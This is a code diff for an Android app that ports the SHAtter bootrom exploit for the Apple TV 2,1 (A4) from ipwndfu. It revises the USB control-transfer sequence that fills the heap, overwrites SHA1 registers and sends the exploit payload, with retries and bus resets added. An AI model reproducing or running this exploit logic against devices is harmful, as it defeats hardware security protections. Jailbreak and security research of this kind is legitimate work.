@@ -5,9 +5,9 @@ import android.hardware.usb.UsbDeviceConnection
 import android.hardware.usb.UsbManager
 
 /**
- * SHAtter for AppleTV2,1 (A4 / CPID 0x8930). Port of DeviceManager::SHAtter.
- * Large getData stages used to hang on Android if USB stalled — transfers
- * are now checked and timed so 25% cannot freeze the UI forever.
+ * SHAtter for AppleTV2,1 (A4 / CPID 0x8930).
+ * Sequence matches ipwndfu: reset_counters, get_data, usb_reset, re-acquire,
+ * request_image_validation (+reset), heap fill, SHA1 stage, payload with wValue=0.
  */
 object Shatter {
     private val PAYLOAD = byteArrayOf(
@@ -58,71 +58,105 @@ object Shatter {
         log: (String) -> Unit,
         progress: (Double) -> Unit,
     ): Boolean {
+        fun dfuPresent(): Boolean = usb.deviceList.values.any {
+            it.vendorId == AppleUsb.VENDOR && it.productId == AppleUsb.PID_DFU
+        }
+
         fun reopen(): UsbDeviceConnection? {
             val pair = open() ?: return null
-            AppleUsb.claim(pair.second, pair.first)
+            if (!AppleUsb.claim(pair.second, pair.first, configure = false)) {
+                log("claimInterface failed")
+                try { pair.second.close() } catch (_: Exception) {}
+                return null
+            }
             return pair.second
+        }
+
+        fun busReset(c: UsbDeviceConnection) {
+            val ok = try { c.resetDevice() } catch (_: Throwable) { false }
+            log(if (ok) "usb reset" else "usb reset not supported")
+            try { c.close() } catch (_: Exception) {}
+            val until = System.currentTimeMillis() + 2500
+            while (System.currentTimeMillis() < until && dfuPresent()) Thread.sleep(40)
+            Thread.sleep(300)
         }
 
         log("Preparing buffer overflow")
         progress(5.0)
         var c = reopen() ?: return fail(log, "open failed")
         resetCounters(c)
-        // small read — errors here are fatal
-        if (!getData(c, 0x40, log, allowStall = false)) {
-            c.close()
+        if (!getData(c, 0x40, log, strict = true)) {
+            try { c.close() } catch (_: Exception) {}
             return fail(log, "getData 0x40")
         }
-        progress(15.0)
-        c.close()
+        progress(12.0)
+        busReset(c)
 
         log("Requesting validation")
         c = reopen() ?: return fail(log, "open after reset")
         requestImageValidation(c)
-        c.close()
+        progress(20.0)
+        busReset(c)
 
-        // 0x2C000 is ~176 packets — this is the stage that looked "stuck at 25%"
-        log("Filling buffer (this can take ~30–90s on OTG)")
+        log("Filling buffer")
         progress(25.0)
         c = reopen() ?: return fail(log, "open fill")
-        // stalls/errors during the big fill are common mid-SHAtter; keep going
-        getData(c, 0x2C000, log, allowStall = true) { done, total ->
-            val pct = 25.0 + (done.toDouble() / total) * 10.0
-            progress(pct)
+        val filled = getData(c, 0x2C000, log, strict = true) { done, total ->
+            progress(25.0 + (done.toDouble() / total) * 12.0)
         }
-        progress(35.0)
         try { c.close() } catch (_: Exception) {}
-
-        Thread.sleep(800)
+        if (!filled) return fail(log, "heap fill failed — cable or OTG dropped")
+        progress(40.0)
+        Thread.sleep(500)
 
         log("Overwriting SHA1 registers")
-        progress(40.0)
-        c = reopen() ?: return fail(log, "open sha1 — re-enter DFU and retry")
+        c = reopen() ?: return fail(log, "open sha1")
         resetCounters(c)
-        getData(c, 0x140, log, allowStall = true)
-        try { c.close() } catch (_: Exception) {}
+        if (!getData(c, 0x140, log, strict = true)) {
+            try { c.close() } catch (_: Exception) {}
+            return fail(log, "getData 0x140")
+        }
+        progress(50.0)
+        busReset(c)
 
+        log("Requesting validation")
         c = reopen() ?: return fail(log, "open validate2")
-        progress(55.0)
         requestImageValidation(c)
-        try { c.close() } catch (_: Exception) {}
+        progress(60.0)
+        busReset(c)
 
         log("Sending SHAtter payload")
-        c = reopen() ?: return fail(log, "open payload")
         progress(65.0)
-        if (!sendBuffer(c, PAYLOAD, log)) {
+        var sent = false
+        c = reopen() ?: return fail(log, "open payload")
+        for (attempt in 1..6) {
+            if (attempt > 1) {
+                log("payload retry $attempt")
+                try { c.close() } catch (_: Exception) {}
+                Thread.sleep(500)
+                c = reopen() ?: continue
+            }
+            if (sendData(c, PAYLOAD, log)) {
+                sent = true
+                break
+            }
+        }
+        if (!sent) {
             try { c.close() } catch (_: Exception) {}
-            return false
+            return fail(log, "payload send failed")
         }
         progress(85.0)
-        log("Overwriting exception vectors")
-        getData(c, 0x2C000, log, allowStall = true)
-        progress(95.0)
+        log("Triggering overwrite")
+        getData(c, 0x2C000, log, strict = false)
         try { c.close() } catch (_: Exception) {}
-
         Thread.sleep(800)
         progress(100.0)
-        log("SHAtter successful")
+        val serial = usb.deviceList.values.firstOrNull {
+            it.vendorId == AppleUsb.VENDOR && it.productId == AppleUsb.PID_DFU
+        }?.serialNumber ?: ""
+        if (serial.isNotEmpty()) log(serial)
+        if ("PWND" in serial) log("SHAtter successful")
+        else log("SHAtter payload sent")
         return true
     }
 
@@ -132,18 +166,14 @@ object Shatter {
     }
 
     private fun resetCounters(c: UsbDeviceConnection) {
-        c.controlTransfer(0x21, 4, 0, 0, null, 0, 500)
+        c.controlTransfer(0x21, 4, 0, 0, ByteArray(0), 0, 1000)
     }
 
-    /**
-     * @param allowStall when true, a failed/short transfer ends the loop early
-     *   instead of spinning on 5s timeouts (the old hang-at-25% bug).
-     */
     private fun getData(
         c: UsbDeviceConnection,
         length: Int,
         log: (String) -> Unit,
-        allowStall: Boolean,
+        strict: Boolean,
         onProgress: ((Int, Int) -> Unit)? = null,
     ): Boolean {
         val packet = 0x800
@@ -153,59 +183,49 @@ object Shatter {
         var packets = 0
         while (left > 0) {
             val n = minOf(packet, left)
-            // 800ms — never sit on a dead pipe for 5s × 176 packets
-            val r = c.controlTransfer(0xA1, 2, 0, 0, buf, n, 800)
-            if (r < 0) {
-                if (allowStall) {
-                    log("getData stall after $done/$length (ok for this stage)")
+            val r = c.controlTransfer(0xA1, 2, 0, 0, buf, n, if (strict) 2000 else 800)
+            if (r != n) {
+                if (!strict) {
+                    log("getData ended at $done/$length r=$r")
                     return true
                 }
                 log("getData failed r=$r at $done/$length")
                 return false
             }
-            if (r == 0 && allowStall) {
-                log("getData empty after $done/$length")
-                return true
-            }
             left -= n
             done += n
             packets++
-            if (packets % 16 == 0) {
-                onProgress?.invoke(done, length)
-            }
+            if (packets % 8 == 0) onProgress?.invoke(done, length)
         }
         return true
     }
 
     private fun requestImageValidation(c: UsbDeviceConnection) {
-        c.controlTransfer(0x21, 1, 0, 0, null, 0, 500)
-        val blank = ByteArray(16)
-        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 500)
-        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 500)
-        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 500)
+        c.controlTransfer(0x21, 1, 0, 0, ByteArray(0), 0, 1000)
+        val blank = ByteArray(6)
+        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
+        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
+        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 1000)
     }
 
-    private fun sendBuffer(c: UsbDeviceConnection, data: ByteArray, log: (String) -> Unit): Boolean {
+    // ipwndfu send_data: wValue stays 0
+    private fun sendData(c: UsbDeviceConnection, data: ByteArray, log: (String) -> Unit): Boolean {
         val packet = 0x800
         var sent = 0
-        var block = 0
+        var part = 0
         while (sent < data.size) {
             val n = minOf(packet, data.size - sent)
-            val chunk = data.copyOfRange(sent, sent + n)
-            val r = c.controlTransfer(0x21, 1, block, 0, chunk, n, 2000)
+            val chunk = ByteArray(n)
+            System.arraycopy(data, sent, chunk, 0, n)
+            val r = c.controlTransfer(0x21, 1, 0, 0, chunk, n, 5000)
             if (r != n) {
-                log("payload send block $block r=$r")
+                log("payload send part $part r=$r wanted $n")
                 return false
             }
-            val status = ByteArray(6)
-            c.controlTransfer(0xA1, 3, 0, 0, status, 6, 500)
             sent += n
-            block++
+            part++
         }
-        c.controlTransfer(0x21, 1, block, 0, ByteArray(0), 0, 500)
-        val status = ByteArray(6)
-        c.controlTransfer(0xA1, 3, 0, 0, status, 6, 500)
-        c.controlTransfer(0xA1, 3, 0, 0, status, 6, 500)
+        log("payload ${data.size} bytes sent")
         return true
     }
 }
